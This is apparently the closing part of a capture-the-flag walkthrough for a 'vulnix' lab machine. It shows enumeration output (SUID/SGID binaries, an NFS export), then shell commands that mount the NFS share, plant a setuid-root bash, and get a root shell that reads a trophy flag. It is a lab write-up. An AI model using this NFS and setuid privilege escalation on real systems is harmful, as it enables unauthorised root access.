-rwsr-sr-x 1 libuuid libuuid 17976 Mar 30  2012 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 273272 Feb  4  2011 /usr/sbin/pppd
-rwsr-xr-x 1 root root 5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 316824 Feb 22  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper 
-rwsr-xr-x 1 root root 248056 Apr  2  2012 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 9728 Apr 20  2012 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 56208 Jul 28  2011 /usr/bin/mtr
-rwsr-xr-x 2 root root 69708 Jun  1  2012 /usr/bin/sudo
-rwsr-xr-x 1 root root 30896 Apr  9  2012 /usr/bin/newgrp
-rwsr-xr-x 1 root root 41284 Apr  9  2012 /usr/bin/passwd
-rwsr-xr-x 1 root root 40292 Apr  9  2012 /usr/bin/chfn
-rwsr-sr-x 1 daemon daemon 42800 Oct 25  2011 /usr/bin/at
-rwsr-xr-x 2 root root 69708 Jun  1  2012 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 14012 Nov  8  2011 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 57956 Apr  9  2012 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 31748 Apr  9  2012 /usr/bin/chsh
-rwsr-sr-x 1 root mail 75600 Aug  4  2010 /usr/bin/procmail
-rwsr-xr-x 1 root root 39116 Nov  8  2011 /bin/ping6
-rwsr-xr-x 1 root root 88760 Mar 30  2012 /bin/mount
-rwsr-xr-x 1 root root 67720 Mar 30  2012 /bin/umount
-rwsr-xr-x 1 root root 31116 Apr  9  2012 /bin/su
-rwsr-xr-x 1 root root 34740 Nov  8  2011 /bin/ping
-rwsr-xr-x 1 root root 26252 Mar  2  2012 /bin/fusermount


[-] SGID files:
-rwxr-sr-x 1 root shadow 30364 Feb  9  2012 /sbin/unix_chkpwd
-rwsr-sr-x 1 libuuid libuuid 17976 Mar 30  2012 /usr/sbin/uuidd
-r-xr-sr-x 1 root postdrop 13624 Jul 30  2012 /usr/sbin/postdrop
-r-xr-sr-x 1 root postdrop 13608 Jul 30  2012 /usr/sbin/postqueue
-rwxr-sr-x 1 root ssh 128416 Apr  2  2012 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 18120 Apr  9  2012 /usr/bin/expiry
-rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-unlock
-rwxr-sr-x 1 root mail 13708 Aug  4  2010 /usr/bin/lockfile
-rwxr-sr-x 1 root mail 9720 Jan 10  2012 /usr/bin/mutt_dotlock
-rwsr-sr-x 1 daemon daemon 42800 Oct 25  2011 /usr/bin/at
-rwxr-sr-x 1 root mail 13932 Oct 17  2011 /usr/bin/dotlockfile
-rwxr-sr-x 1 root tty 18036 Mar 30  2012 /usr/bin/wall
-rwxr-sr-x 1 root shadow 45284 Apr  9  2012 /usr/bin/chage
-rwxr-sr-x 1 root tty 9728 Mar 31  2012 /usr/bin/bsd-write
-rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-lock
-rwxr-sr-x 1 root crontab 34776 Jun 19  2012 /usr/bin/crontab
-rwxr-sr-x 1 root utmp 365260 Jun  6  2011 /usr/bin/screen
-rwxr-sr-x 1 root mlocate 34432 Aug 17  2011 /usr/bin/mlocate
-rwsr-sr-x 1 root mail 75600 Aug  4  2010 /usr/bin/procmail


[+] Hosts.equiv file and contents: 
-rw-r--r-- 1 root root 117 Jun 26  2010 /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#                   command access to your system .

-] NFS config details: 
-rw-r--r-- 1 root root 420 Sep  2  2012 /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r----- 1 root fuse 216 Oct 18  2011 /etc/fuse.conf
-rw-r--r-- 1 root root 834 Dec 16  2011 /etc/gssapi_mech.conf
-rw-r--r-- 1 root root 144 Sep  2  2012 /etc/kernel-img.conf
-rw-r--r-- 1 root root 839 Apr 10  2012 /etc/insserv.conf
-rw-r--r-- 1 root root 326 Aug 17  2011 /etc/updatedb.conf
-rw-r--r-- 1 root root 956 Mar 30  2012 /etc/mke2fs.conf
-rw-r--r-- 1 root root 552 Feb  9  2012 /etc/pam.conf
-rw-r--r-- 1 root root 350 Sep  2  2012 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 2083 Dec  5  2011 /etc/sysctl.conf
-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf
-rw-r--r-- 1 root root 1318 Sep  2  2012 /etc/inetd.conf
-rw-r--r-- 1 root root 2969 Mar 15  2012 /etc/debconf.conf
-rw-r--r-- 1 root root 34 Sep  2  2012 /etc/ld.so.conf
-rw-r--r-- 1 root root 206 Mar 27  2012 /etc/idmapd.conf
-rw-r--r-- 1 root root 4728 May  2  2012 /etc/hdparm.conf
-rw-r--r-- 1 root root 3343 Apr 20  2012 /etc/gai.conf
-rw-r--r-- 1 root root 599 Oct  4  2011 /etc/logrotate.conf
-rw-r--r-- 1 root root 1260 May  2  2011 /etc/ucf.conf
-rw-r--r-- 1 root root 6961 Sep  2  2012 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 92 Apr 19  2012 /etc/host.conf
-rw-r--r-- 1 root root 1263 Mar 30  2012 /etc/rsyslog.conf
-rw-r--r-- 1 root root 475 Apr 19  2012 /etc/nsswitch.conf
-rw-r--r-- 1 root root 321 Mar 30  2012 /etc/blkid.conf
-rw-r--r-- 1 root root 604 Oct 19  2011 /etc/deluser.conf
-rw-r--r-- 1 root root 2981 Sep  2  2012 /etc/adduser.conf

[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Sep  2  2012 .
drwxr-xr-x 12 root root 4096 Sep  2  2012 ..


### SCAN COMPLETE ####################################

sudoedit /etc/exports # Disable  root_squash with root_squash and reboot the vm
```

```
root@kali:~/Documents/vulnix# umount mountme
root@kali:~/Documents/vulnix# mount -o vers=3,nolock -t nfs 192.168.88.134:/home/vulnix /root/Documents/vulnix/mountme/
root@kali:~/Documents/vulnix# cd mountme
root@kali:~/Documents/vulnix/mountm# cp /bin/bash bash
root@kali:~/Documents/vulnix/mountm# chmod 4777 bash
root@kali:~/Documents/vulnix/mountm# su vulnix
$ bash
vulnix@kali:/root/Documents/vulnix$ ssh 192.168.88.134 -i /tmp/key
vulnix@vulnix:~$ ./bash 
bash: ./bash: cannot execute binary file
vulnix@vulnix:~$ cp /bin/bash .
vulnix@kali:/root/Documents/vulnix$ exit
root@kali:~/Documents/vulnix# chmod 4777 bash
root@kali:~/Documents/vulnix# chown root:root bash
root@kali:~/Documents/vulnix# su vulnix
vulnix@kali:/root/Documents/vulnix/mountme$ ssh 192.168.88.134 -i /tmp/key
vulnix@vulnix:~$ ./bash 
bash-4.2$ whoami
vulnix
bash-4.2$ exit
exit
vulnix@vulnix:~$ ./bash -p
bash-4.2# whoami
root
bash-4.2# cat /root/trophy.txt 
cc614640424f5bd60ce5d5264899c3be
```